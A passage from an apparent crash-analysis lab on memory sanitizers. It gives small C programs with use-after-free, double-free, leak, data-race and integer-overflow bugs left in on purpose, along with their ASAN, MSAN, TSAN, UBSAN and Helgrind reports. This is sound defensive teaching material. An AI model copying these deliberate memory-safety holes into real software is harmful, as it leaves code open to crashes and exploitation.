WRITE of size 4 at 0x502000000010 thread T0
    #0 0x59df62e93266 in main src/uaf.c:8
    #1 0x7c6892c2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #2 0x7c6892c2a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #3 0x59df62e93104 in _start (/home/dev/crash_analysis_lab/uaf+0x1104) (BuildId: c4ef3acea8680ee4593d16ce8307652cb859190c)

0x502000000010 is located 0 bytes inside of 4-byte region [0x502000000010,0x502000000014)
freed by thread T0 here:
    #0 0x7c68930fc4d8 in free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52
    #1 0x59df62e9322f in main src/uaf.c:7
    #2 0x7c6892c2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x7c6892c2a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x59df62e93104 in _start (/home/dev/crash_analysis_lab/uaf+0x1104) (BuildId: c4ef3acea8680ee4593d16ce8307652cb859190c)

previously allocated by thread T0 here:
    #0 0x7c68930fd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x59df62e931de in main src/uaf.c:5
    #2 0x7c6892c2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x7c6892c2a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x59df62e93104 in _start (/home/dev/crash_analysis_lab/uaf+0x1104) (BuildId: c4ef3acea8680ee4593d16ce8307652cb859190c)

SUMMARY: AddressSanitizer: heap-use-after-free src/uaf.c:8 in main
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa[fd]fa fa fa fa fa fa fa fa fa fa fa fa fa
```

**Analysis**:

- **Error**: heap-use-after-free
- **Operation**: WRITE of size 4 (writing int value 43)
- **Location**: uaf.c:8 (assignment `*ptr = 43`)
- **Allocation**: 4-byte region allocated at line 5
- **Free**: Memory freed at line 7
- **Use**: Dangling pointer write at line 8
- **Shadow byte `fd`**: Freed heap memory (quarantined by ASAN)

**4. Double-Free**:

**Vulnerable Code**:

```c
// ~/crash_analysis_lab/src/df.c
#include <stdlib.h>

int main() {
    char *ptr = malloc(10);
    free(ptr);
    free(ptr);  // Double-free!
    return 0;
}
```

```bash
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/df.c -o df
./df
```

**ASAN Report**:

```text
=================================================================
==1388==ERROR: AddressSanitizer: attempting double-free on 0x502000000010 in thread T0:
    #0 0x71e78a6fc4d8 in free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52
    #1 0x651975eaa1da in main src/df.c:7
    #2 0x71e78a22a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x71e78a22a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x651975eaa0e4 in _start (/home/dev/crash_analysis_lab/df+0x10e4) (BuildId: 9e41cb0cfeda12d633976b0ec4789b8bbcf76d11)

0x502000000010 is located 0 bytes inside of 10-byte region [0x502000000010,0x50200000001a)
freed by thread T0 here:
    #0 0x71e78a6fc4d8 in free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52
    #1 0x651975eaa1ce in main src/df.c:6
    #2 0x71e78a22a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x71e78a22a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x651975eaa0e4 in _start (/home/dev/crash_analysis_lab/df+0x10e4) (BuildId: 9e41cb0cfeda12d633976b0ec4789b8bbcf76d11)

previously allocated by thread T0 here:
    #0 0x71e78a6fd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x651975eaa1be in main src/df.c:5
    #2 0x71e78a22a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x71e78a22a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x651975eaa0e4 in _start (/home/dev/crash_analysis_lab/df+0x10e4) (BuildId: 9e41cb0cfeda12d633976b0ec4789b8bbcf76d11)

SUMMARY: AddressSanitizer: double-free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52 in free
==1388==ABORTING
Aborted
```

**Analysis**:

- **Error**: double-free (attempting to free already-freed memory)
- **Operation**: Second free() call on same pointer
- **Location**: df.c:7 (second `free(ptr)`)
- **Allocation**: 10-byte region allocated at line 5
- **First free**: Memory freed at line 6
- **Second free**: Invalid free attempt at line 7
- **Impact**: Can corrupt heap metadata, potentially exploitable

**5. Memory Leak**:

**Vulnerable Code**:

```c
// ~/crash_analysis_lab/src/ml.c
#include <stdlib.h>

int main() {
    char *leak = malloc(100);
    // No free! Program exits.
    return 0;
}
```

```bash
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/ml.c -o ml
./ml
```

**ASAN Report** (with leak detection enabled):

```text
=================================================================
==1404==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 100 byte(s) in 1 object(s) allocated from:
    #0 0x7536e1efd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x5b8260bb219e in main src/ml.c:5
    #2 0x7536e1a2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x7536e1a2a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x5b8260bb20c4 in _start (/home/dev/crash_analysis_lab/ml+0x10c4) (BuildId: a852beeb6801e117a58cb487aa280c8fb55a3964)

SUMMARY: AddressSanitizer: 100 byte(s) leaked in 1 allocation(s).
Aborted
```

**Analysis**:

- **Error**: Memory leak detected by LeakSanitizer (part of ASAN)
- **Type**: Direct leak (pointer lost, not reachable)
- **Size**: 100 bytes in 1 allocation
- **Location**: ml.c:5 (malloc call)
- **Cause**: Program exits without freeing allocated memory
- **Note**: LeakSanitizer runs at program exit to detect unreachable allocations

#### ASAN Options and Configuration

**Key Options**:

```bash
# Common ASAN options
export ASAN_OPTIONS="symbolize=1:abort_on_error=1:detect_leaks=1:detect_stack_use_after_return=1:check_initialization_order=1:strict_init_order=1:allocator_may_return_null=1"

# Break into debugger on error
export ASAN_OPTIONS="symbolize=1:abort_on_error=0:halt_on_error=1"

# Generate detailed logs
export ASAN_OPTIONS="symbolize=1:log_path=asan.log:log_exe_name=1"

# Suppress specific errors
export ASAN_OPTIONS="suppressions=asan_suppressions.txt"
```

**Suppression File Example** (asan_suppressions.txt):

```text
# Suppress known false positives
leak:known_leak_function
heap-buffer-overflow:third_party_library
```

### Comparing ASAN with Traditional Debugging

**ASAN Advantages**:

- Detects errors at point of occurrence (not later crash)
- Provides exact allocation/free stack traces
- Catches leaks without explicit testing
- Red zones catch off-by-one errors
- Quarantine catches some UAF that might not crash

**Limitations**:

- Performance overhead limits production use
- Doesn't catch all logic bugs
- Can miss non-deterministic races
- Requires recompilation

**When to Use Each**:

- **ASAN**: During development and fuzzing for comprehensive testing
- **Traditional debugging**: Production crashes, reverse engineering binaries
- **Both**: Reproduce ASAN-found bug in debugger for detailed analysis

### When ASAN Changes Behavior

> [!WARNING]
> ASAN modifies heap layout and timing.
> A bug that crashes reliably under ASAN may behave completely differently (or not manifest at all) in a non-ASAN build.
> Always reproduce important bugs in both configurations.

**Why ASAN Changes Crash Behavior**:

1. **Heap Layout Changes**:
   - ASAN adds red zones (padding) around allocations
   - Allocation sizes are rounded up
   - Heap addresses are completely different
   - Adjacent allocations that would overlap in normal builds are separated

2. **Quarantine Effects**:
   - Freed memory is held in quarantine before reuse
   - UAF bugs may "disappear" because memory isn't immediately reallocated
   - Without ASAN, freed memory may be immediately reused

3. **Timing Differences**:
   - ASAN instrumentation adds overhead
   - Race conditions may hide or manifest differently
   - Callback timing changes

#### Mini-Lab: Same Bug, Different Manifestation

**uaf_timing.c** - Demonstrates how UAF behavior differs with/without ASAN:

```c
// ~/crash_analysis_lab/src/uaf_timing.c - UAF that behaves differently with ASAN
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // Allocate object
    char* victim = malloc(32);
    strcpy(victim, "ORIGINAL_DATA");
    printf("[1] Allocated victim at %p: %s\n", victim, victim);

    // Free it
    free(victim);
    printf("[2] Freed victim\n");

    // Allocate something else (may reuse the slot without ASAN)
    char* other = malloc(32);
    strcpy(other, "REPLACED!!!!!");
    printf("[3] Allocated other at %p: %s\n", other, other);

    // USE AFTER FREE - read victim
    printf("[4] UAF read of victim: %s\n", victim);

    // The output differs dramatically:
    // Without ASAN: May print "REPLACED!!!!!" (memory reused)
    // With ASAN:    Crashes immediately at the UAF read

    free(other);
    return 0;
}
```

**Exercise**:

```bash
cd ~/crash_analysis_lab
# set the asan envs(from start of day 2)
# Build without ASAN
gcc -g -O0 -fno-omit-frame-pointer src/uaf_timing.c -o uaf_normal

# Build with ASAN
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/uaf_timing.c -o uaf_asan

# Run without ASAN - observe behavior
./uaf_normal
# [1] Allocated victim at 0x5a9d113fa2a0: ORIGINAL_DATA
# [2] Freed victim
# [3] Allocated other at 0x5a9d113fa2a0: REPLACED!!!!!
# [4] UAF read of victim: REPLACED!!!!!  <-- No crash! Memory reused.

# Run with ASAN - immediate crash
./uaf_asan
# =================================================================
# [1] Allocated victim at 0x503000000040: ORIGINAL_DATA
# [2] Freed victim
# [3] Allocated other at 0x503000000070: REPLACED!!!!!  <-- Different address!
# =================================================================
# ==1443==ERROR: AddressSanitizer: heap-use-after-free on address 0x503000000040 at pc 0x746dd12a1a6a # bp 0x7fff339b5190 sp 0x7fff339b4908
# ... ASAN report with allocation/free stacks ...
```

**Key Observations**:

1. Without ASAN: `malloc()` immediately reused the freed slot
2. With ASAN: Quarantine prevents reuse; UAF is detected
3. The "bug" exists in both builds, but only ASAN catches it

#### Quarantine Tuning

Control ASAN's quarantine to understand timing effects:

```bash
# Disable quarantine entirely (behaves more like non-ASAN)
export ASAN_OPTIONS="quarantine_size_mb=0"
./uaf_asan
# May now behave more like non-ASAN build (memory reused faster)

# Increase quarantine (hold freed memory longer)
export ASAN_OPTIONS="quarantine_size_mb=256"
./uaf_asan
# UAF detection more reliable, but uses more memory

# Default is usually 256MB - check with:
export ASAN_OPTIONS="verbosity=1"
./uaf_asan 2>&1 | grep quarantine
```

#### Reproduction Best Practice

For any bug found with ASAN:

```bash
# 1. Document ASAN detection
./target_asan < crash_input 2>&1 | tee asan_report.txt

# 2. ALWAYS reproduce without ASAN
./target_normal < crash_input 2>&1 | tee normal_report.txt

# 3. Compare behaviors
echo "=== ASAN Behavior ===" && head -20 asan_report.txt
echo "=== Normal Behavior ===" && head -20 normal_report.txt

# 4. If normal build doesn't crash:
#    - Bug is still real, but harder to exploit
#    - May need heap grooming for reliable exploitation
#    - Document both behaviors in your report
```

### Other Sanitizers

- While AddressSanitizer (ASAN) is the most widely-used sanitizer for spatial memory safety, the LLVM sanitizer family includes several complementary tools that detect different bug classes.
- Understanding when to use each sanitizer—and which ones can be combined—is essential for comprehensive testing.

#### MemorySanitizer (MSAN): Detecting Uninitialized Memory

**What MSAN Detects**:

- Use of uninitialized memory
- Uninitialized variables passed to functions
- Uninitialized memory in conditionals
- Propagation of uninitialized data

**Compilation**:

```bash
# Compile with MSAN
clang -fsanitize=memory -fPIE -pie -fno-omit-frame-pointer -g -O0 program.c -o program_msan

# MSAN requires instrumented standard library for best results
# On Ubuntu with custom-built libc++:
clang -fsanitize=memory -stdlib=libc++ -fPIE -pie -g -O0 program.c -o program_msan
```

**Installing libc++ for MSAN from apt.llvm.org** (Optional but recommended):

MSAN works best with an instrumented libc++. Without it, you may get false positives from uninstrumented stdlib calls. The LLVM project provides pre-built libc++ packages via [apt.llvm.org](https://apt.llvm.org/).

```bash
sudo apt-get update
sudo apt-get install -y wget lsb-release software-properties-common gnupg

# install llvm if you haven't already

sudo apt-get install -y \
    libc++-19-dev \
    libc++abi-19-dev
```

**Example MSAN Detection**:

```c
// ~/crash_analysis_lab/src/msan.c
#include <stdio.h>

int main() {
    int x;  // Uninitialized!
    if (x > 10) {  // Reading uninitialized memory
        printf("x is large\n");
    }
    return 0;
}
```

```bash
cd ~/crash_analysis_lab
clang++-19 -fsanitize=memory -stdlib=libc++ -o msan src/msan.c
./msan
```

**MSAN Report**:

```text
==2329==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x555555621d01 in main (/home/dev/crash_analysis_lab/msan+0xcdd01) (BuildId: a1bfcfbc905803f4547f0977c2e647e8f076e8a8)
    #1 0x7ffff7a2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #2 0x7ffff7a2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #3 0x5555555862f4 in _start (/home/dev/crash_analysis_lab/msan+0x322f4) (BuildId: a1bfcfbc905803f4547f0977c2e647e8f076e8a8)

SUMMARY: MemorySanitizer: use-of-uninitialized-value (/home/dev/crash_analysis_lab/msan+0xcdd01) (BuildId: a1bfcfbc905803f4547f0977c2e647e8f076e8a8) in main
Exiting
```

**When to Use MSAN**:

- Logic errors from uninitialized variables
- Information leaks via uninitialized stack/heap data
- Parser bugs that rely on uninitialized state
- Kernel-style code sensitive to info leaks

#### ThreadSanitizer (TSAN): Detecting Data Races

**What TSAN Detects**:

- Data races between threads
- Unsynchronized memory accesses
- Use-after-free in multithreaded contexts
- Deadlocks
- Lock order violations

**Example TSAN Detection**:

```c
// ~/crash_analysis_lab/src/tsan.c
#include <pthread.h>
#include <stdio.h>

int shared_variable = 0;

void* thread_func(void* arg) {
    shared_variable++;  // Race condition!
    return NULL;
}

int main() {
    pthread_t t1, t2;
    pthread_create(&t1, NULL, thread_func, NULL);
    pthread_create(&t2, NULL, thread_func, NULL);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    printf("Result: %d\n", shared_variable);
    return 0;
}
```

**Compilation**:

```bash
gcc -fsanitize=thread -g -O0 -fno-omit-frame-pointer src/tsan.c -o tsan -lpthread
setarch $(uname -m) -R ./tsan
```

**TSAN Report**:

```text
==================
WARNING: ThreadSanitizer: data race (pid=10025)
  Read of size 4 at 0x555555558014 by thread T2:
    #0 thread_func src/tsan.c:7 (tsan+0x1294) (BuildId: 44799b6c3e78781b5904ab4054a54211be4ffe7d)

  Previous write of size 4 at 0x555555558014 by thread T1:
    #0 thread_func src/tsan.c:7 (tsan+0x12ac) (BuildId: 44799b6c3e78781b5904ab4054a54211be4ffe7d)

  Location is global 'shared_variable' of size 4 at 0x555555558014 (tsan+0x4014)

  Thread T2 (tid=10028, running) created by main thread at:
    #0 pthread_create ../../../../src/libsanitizer/tsan/tsan_interceptors_posix.cpp:1022 (libtsan.so.2+0x5ac1a) (BuildId: 38097064631f7912bd33117a9c83d08b42e15571)
    #1 main src/tsan.c:14 (tsan+0x1327) (BuildId: 44799b6c3e78781b5904ab4054a54211be4ffe7d)

  Thread T1 (tid=10027, finished) created by main thread at:
    #0 pthread_create ../../../../src/libsanitizer/tsan/tsan_interceptors_posix.cpp:1022 (libtsan.so.2+0x5ac1a) (BuildId: 38097064631f7912bd33117a9c83d08b42e15571)
    #1 main src/tsan.c:13 (tsan+0x130a) (BuildId: 44799b6c3e78781b5904ab4054a54211be4ffe7d)

SUMMARY: ThreadSanitizer: data race src/tsan.c:7 in thread_func
==================
Result: 2
ThreadSanitizer: reported 1 warnings
```

**When to Use TSAN**:

- Multithreaded applications
- Server software with concurrent request handling
- Race condition vulnerabilities
- Non-deterministic crashes
- Lock-free data structures

### Lab: Race Condition Analysis with TSAN and valgrind

#### Lab Target: Multithreaded UAF

**race_uaf.c** - A race condition leading to use-after-free:

```c
// ~/crash_analysis_lab/src/race_uaf.c - Thread race causes UAF
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    char* data;
    int active;
} Resource;

Resource* global_resource = NULL;

void* writer_thread(void* arg) {
    for (int i = 0; i < 1000; i++) {
        if (global_resource && global_resource->active) {
            // RACE: Resource may be freed between check and use
            strcpy(global_resource->data, "Updated by writer");
        }
        usleep(100);
    }
    return NULL;
}

void* destroyer_thread(void* arg) {
    for (int i = 0; i < 100; i++) {
        usleep(1000);

        if (global_resource) {
            // RACE: Writer may be using data when we free it
            global_resource->active = 0;
            free(global_resource->data);  // UAF source!
            global_resource->data = NULL;

            // Reallocate
            global_resource->data = malloc(64);
            global_resource->active = 1;
        }
    }
    return NULL;
}

int main() {
    // Initialize resource
    global_resource = malloc(sizeof(Resource));
    global_resource->data = malloc(64);
    global_resource->active = 1;
    strcpy(global_resource->data, "Initial data");

    pthread_t writer, destroyer;
    pthread_create(&writer, NULL, writer_thread, NULL);
    pthread_create(&destroyer, NULL, destroyer_thread, NULL);

    pthread_join(writer, NULL);
    pthread_join(destroyer, NULL);

    free(global_resource->data);
    free(global_resource);
    return 0;
}
```

#### Exercise Part 1: Reproduce with TSAN

```bash
gcc -fsanitize=thread -g -O0 -fno-omit-frame-pointer src/race_uaf.c -o race_uaf -lpthread
setarch $(uname -m) -R ./race_uaf
```

#### Exercise Part 2: Detect Races with Helgrind

TSAN detects the race, but Helgrind (part of Valgrind) provides more detailed analysis and works in VMs without hardware PMU support:

```bash
cd ~/crash_analysis_lab
# Build normally (without TSAN - for Helgrind analysis)
clang -g -O0 -fno-omit-frame-pointer src/race_uaf.c -o race_normal -lpthread

# Normal run - may or may not crash
./race_normal  # Often "works" due to lucky timing

# Install Valgrind if needed
sudo apt install valgrind

# Run with Helgrind - detects races without needing a crash
valgrind --tool=helgrind ./race_normal

# For more detailed history (slower but more accurate)
valgrind --tool=helgrind --history-level=full ./race_normal

# Alternative: DRD (another Valgrind thread checker, sometimes catches different issues)
valgrind --tool=drd ./race_normal
```

**Sample Helgrind Output:**

```
==1124== Possible data race during write of size 4 at 0x4A8B048 by thread #3
==1124== Locks held: none
==1124==    at 0x10924C: destroyer_thread (src/race_uaf.c:32)
==1124==
==1124== This conflicts with a previous read of size 4 by thread #2
==1124== Locks held: none
==1124==    at 0x1091C5: writer_thread (src/race_uaf.c:17)
==1124==  Address 0x4a8b048 is 8 bytes inside a block of size 16 alloc'd
==1124==    at 0x48488A8: malloc
==1124==    by 0x1092C8: main (src/race_uaf.c:46)
```

Helgrind shows:

- Which threads are racing (thread #2 vs #3)
- Exact source locations (line 32 vs line 17)
- The memory address and allocation origin
- That no locks were held during access

#### Exercise Part 3: Analyze the Race Conditions

Use Helgrind output to answer these questions:

1. **What data is being raced on?**

   Look for "Possible data race" messages - they show the address and what allocated it:

   ```
   Address 0x4a8b048 is 8 bytes inside a block of size 16 alloc'd
      by main (src/race_uaf.c:46)
   ```

2. **Which threads are involved?**

   Helgrind announces threads and shows their creation stack:

   ```
   Thread #3 was created
      at pthread_create
      by main (src/race_uaf.c:53)
   ```

3. **What's the UAF pattern?**

   Look for races where one thread writes/frees while another reads:

   ```
   # Thread 3 (destroyer) writes to data->active
   destroyer_thread (src/race_uaf.c:32)

   # Thread 2 (writer) reads data->active
   writer_thread (src/race_uaf.c:17)
   ```

4. **Identify the strcpy UAF:**
   ```
   Possible data race during write of size 1 at 0x4A8B090 by thread #2
      at strcpy
      by writer_thread (src/race_uaf.c:19)
   Address 0x4a8b090 is 0 bytes inside a block of size 64 alloc'd
      by destroyer_thread (src/race_uaf.c:37)  # <-- reallocated after free!
   ```

#### Lab Deliverables

1. **TSAN report** showing the detected race
2. **valgrind helgrind** command that reproduces the crash
3. **Interleaving description**: Which thread did what, in what order
4. **Root cause**: One paragraph explaining the bug

**Success Criteria**:

- Can detect race with TSAN
- Can reproduce race with valgrind
- Can explain the thread interleaving that causes the bug
- Understand why normal runs often don't crash

### UndefinedBehaviorSanitizer (UBSAN): Catching Undefined Behavior

**What UBSAN Detects**:

- Integer overflow (signed)
- Division by zero
- Null pointer dereference
- Misaligned pointer access
- Array bounds violations (with bounds checking)
- Type confusion (via vptr checks)
- Shifts by invalid amounts

**Example UBSAN Detection**:

```c
// ~/crash_analysis_lab/src/ubsan.c
#include <stdio.h>
#include <limits.h>

int main() {
    int x = INT_MAX;
    x++;  // Signed integer overflow
    printf("x = %d\n", x);

    int y = 5;
    int z = y / 0;  // Division by zero

    return 0;
}
```

**Compilation**:

```bash
# Compile with UBSAN (all checks)
clang -fsanitize=undefined -g -O0 -fno-omit-frame-pointer src/ubsan.c -o ubsan

# Compile with specific checks
clang -fsanitize=signed-integer-overflow,bounds -g -O0 -fno-omit-frame-pointer src/ubsan.c -o ubsan1

# Abort on first error (no recovery)
clang -fsanitize=undefined -fno-sanitize-recover=undefined -g -O0 -fno-omit-frame-pointer src/ubsan.c -o ubsan2
```

**Compiler Warning** (at compile time):

```text
src/ubsan.c:11:15: warning: division by zero is undefined [-Wdivision-by-zero]
   11 |     int z = y / 0;  // Division by zero
      |               ^ ~
1 warning generated.
```

**UBSAN Runtime Report**:

```bash
# Run with halt_on_error=0 to see all errors (otherwise aborts on first)
$ UBSAN_OPTIONS=halt_on_error=0 ./ubsan
```

```text
src/ubsan.c:7:6: runtime error: signed integer overflow: 2147483647 + 1 cannot be represented in type 'int'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/ubsan.c:7:6
x = -2147483648
src/ubsan.c:11:15: runtime error: division by zero
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/ubsan.c:11:15
UndefinedBehaviorSanitizer:DEADLYSIGNAL
==1189==ERROR: UndefinedBehaviorSanitizer: FPE on unknown address 0x5555b6f99873 (pc 0x5555b6f99873 bp 0x7ffe6cee6130 sp 0x7ffe6cee6110 T1189)
    #0 0x5555b6f99873 in main /home/dev/crash_analysis_lab/src/ubsan.c:11:15
    #1 0x73ccf2e2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #2 0x73ccf2e2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #3 0x5555b6f6f3e4 in _start (/home/dev/crash_analysis_lab/ubsan+0x53e4)
UndefinedBehaviorSanitizer can not provide additional info.
SUMMARY: UndefinedBehaviorSanitizer: FPE /home/dev/crash_analysis_lab/src/ubsan.c:11:15 in main
==1189==ABORTING
```

**Key Observations**:

- **Integer overflow** (line 7): Detected and recoverable — execution continues, showing wrapped value `-2147483648`
- **Division by zero** (line 11): Detected but fatal — CPU raises `SIGFPE` (Floating Point Exception), program aborts regardless of `halt_on_error` setting
- Without `halt_on_error=0`, UBSAN aborts on the first error (integer overflow)

**When to Use UBSAN**:

- Integer overflow vulnerabilities
- Arithmetic bugs in parsers
- Type confusion detection
- Undefined behavior that doesn't crash immediately
- Hardening development builds

### Sanitizer Combinations

**Compatible Combinations**:

```bash
cd ~/crash_analysis_lab

# ASAN + UBSAN (Recommended for general fuzzing)
clang -fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/ubsan.c -o asan_ubsan

# ASAN + UBSAN + leak detection
clang -fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/ubsan.c -o asan_ubsan_leak
export ASAN_OPTIONS=detect_leaks=1

# MSAN + UBSAN (for uninitialized memory + undefined behavior)
# Note: MSAN requires instrumented libc++, use clang++ with -stdlib=libc++
clang++-19 -fsanitize=memory,undefined -stdlib=libc++ -fPIE -pie -g -O0 -fno-omit-frame-pointer src/ubsan.c -o msan_ubsan
```

**Running Combined Sanitizers**:

```bash
# ASAN + UBSAN catches both memory errors and undefined behavior
$ UBSAN_OPTIONS=halt_on_error=0 ./asan_ubsan
src/ubsan.c:7:6: runtime error: signed integer overflow: 2147483647 + 1 cannot be represented in type 'int'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/ubsan.c:7:6
x = -2147483648
src/ubsan.c:11:15: runtime error: division by zero
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/ubsan.c:11:15
UndefinedBehaviorSanitizer:DEADLYSIGNAL
...
```

**Incompatible Combinations** (Cannot Use Together):

| Combination | Reason                                          |
| ----------- | ----------------------------------------------- |
| ASAN + MSAN | Both use shadow memory with conflicting layouts |
| ASAN + TSAN | Conflicting instrumentation and memory tracking |
| MSAN + TSAN | Conflicting instrumentation                     |

**Combination Best Practices**:

1. **Default Fuzzing Setup**: ASAN + UBSAN
   - Catches most memory corruption + arithmetic errors
   - Good performance trade-off (~2x slowdown)
   - Use: `clang -fsanitize=address,undefined ...`

2. **Dedicated MSAN Run**: Separate build with MSAN + UBSAN
   - Run periodically to catch uninitialized memory
   - Requires instrumented libc++ (`clang++ -stdlib=libc++`)
   - Cannot combine with ASAN

3. **Dedicated TSAN Run**: For multithreaded targets
   - Run separate TSAN build (cannot combine with ASAN/MSAN)
   - Higher overhead (~5-15x slowdown)
   - Use: `gcc -fsanitize=thread -lpthread ...`

### Performance Comparison

| Sanitizer      | CPU Overhead | Memory Overhead | Use Case                                   |
| -------------- | ------------ | --------------- | ------------------------------------------ |
| **ASAN**       | ~2x          | 2-3x            | Spatial memory safety (overflow, UAF)      |
| **MSAN**       | ~3x          | 2-3x            | Uninitialized memory reads                 |
| **TSAN**       | 5-15x        | 5-10x           | Data races in multithreaded code           |
| **UBSAN**      | ~1.2x        | Minimal         | Undefined behavior (overflow, div-by-zero) |
| **ASAN+UBSAN** | ~2.2x        | 2-3x            | Combined memory + arithmetic bugs          |

**Performance Notes**:

- ASAN overhead is predictable and acceptable for fuzzing
- TSAN overhead makes it impractical for long fuzzing campaigns
- UBSAN adds minimal overhead—almost always worth enabling
- MSAN requires instrumented standard library for full effectiveness

### Advanced Sanitizers (Brief Overview)

Several newer sanitizer technologies address ASAN's limitations. These are covered in depth in later weeks but are important to know about for crash analysis:

**HWASan (Hardware-assisted AddressSanitizer)**:

- Uses ARM64 Top Byte Ignore (TBI) feature for memory tagging
- ~2x overhead vs ASAN's ~2x (similar), but uses only ~15% more memory vs ASAN's 2-3x
- Essential for Android/ARM64 crash analysis
- Detects same bug classes as ASAN with better memory efficiency

**MTE (Memory Tagging Extension)**:

- ARM hardware feature (ARMv8.5+, e.g., Pixel 8, server ARM64)
- Near-zero overhead memory safety in production
- Crashes from MTE-enabled binaries require understanding tag mismatch errors
- Increasingly important as ARM64 adoption grows

**GWP-ASan (Google-Wide Performance ASan)**:

- Sampling-based allocator for production use
- Catches ~1% of heap bugs with minimal overhead
- Deployed in Chrome/Chromium and Android (platform- and version-specific), and available via allocator integrations (e.g., LLVM Scudo)
- Useful for analyzing crashes from production telemetry

**Frida for Dynamic Analysis**:

- Runtime instrumentation without recompilation
- Essential for closed-source binary crash analysis
- Can trace memory operations, hook functions, and dump state
- Covered in detail in later weeks for mobile/binary analysis

These tools become relevant when analyzing crashes from production systems, mobile platforms, or closed-source binaries where traditional ASAN isn't available.

#### GWP-ASan: Production Crash Analysis

GWP-ASan (originally "Google-Wide Performance ASan") is a sampling-based heap error detector designed for production use.

**Where GWP-ASan Runs**:

- **Chrome/Chromium**: Deployed in production (often via feature flags/field trials); used for crash telemetry
- **Android**: Integrated into the platform allocator on many devices; configuration is platform-specific
- **LLVM/Scudo allocator**: Includes GWP-ASan; the easiest way to try it locally is building with `-fsanitize=scudo`
- **Other allocators**: Some allocators implement guarded sampling / GWP-ASan-style mechanisms

**How GWP-ASan Works**:

```text
Traditional ASAN: Every allocation → Shadow memory → Every access checked
GWP-ASan:         Random sample → Guard pages → Only sampled allocs checked

┌─────────────────────────────────────────────────────────────┐
│ Normal Allocations (99.9%)        │ GWP-ASan Sampled (0.1%) │
│ ┌─────┬─────┬─────┬─────┐         │ ┌─────┬─────┬─────┐     │
│ │alloc│alloc│alloc│alloc│         │ │GUARD│alloc│GUARD│     │
│ └─────┴─────┴─────┴─────┘         │ └─────┴─────┴─────┘     │
│ No overhead                       │ Guard pages catch OOB   │
└─────────────────────────────────────────────────────────────┘
```

**Analyzing GWP-ASan Crash Reports**:

GWP-ASan reports look similar to ASAN but with sampling context:

```text
*** GWP-ASan detected a memory error ***
Use-after-free at 0x7f1234567890

Allocation:
  #0 0x7f111 in malloc
  #1 0x7f222 in create_object (object.c:45)
  #2 0x7f333 in main (main.c:123)

Deallocation:
  #0 0x7f444 in free
  #1 0x7f555 in destroy_object (object.c:89)
  #2 0x7f666 in cleanup (main.c:150)

Use-after-free access:
  #0 0x7f777 in use_object (object.c:67)
  #1 0x7f888 in process (main.c:175)

GWP-ASan sampling rate: 1/1000 allocations
```

**Enabling GWP-ASan**:

```bash
# IMPORTANT: GWP-ASan is allocator-integrated. There is no generic "enable it in glibc" switch.
# The most practical way to experiment locally is via LLVM Scudo:
clang -fsanitize=scudo -g program.c -o program_scudo

# Adjust sampling via Scudo (example). Lower SampleRate => more sampling.
# SampleRate=1 means "always sample" (development only).
export SCUDO_OPTIONS=GWP_ASAN_SampleRate=1
./program_scudo < crash_input

# Android - check app eligibility
adb shell getprop | grep gwp
# persist.device_config.runtime_native.gwp_asan.* properties

# Chrome/Chromium - see current docs (flags/config changes over time)
# https://chromium.googlesource.com/chromium/src/+/HEAD/docs/gwp_asan.md
```

**Reproducing GWP-ASan Crashes**:

GWP-ASan crashes are non-deterministic (sampled). To reproduce:

```bash
# Option 1: Use full ASAN to reproduce deterministically
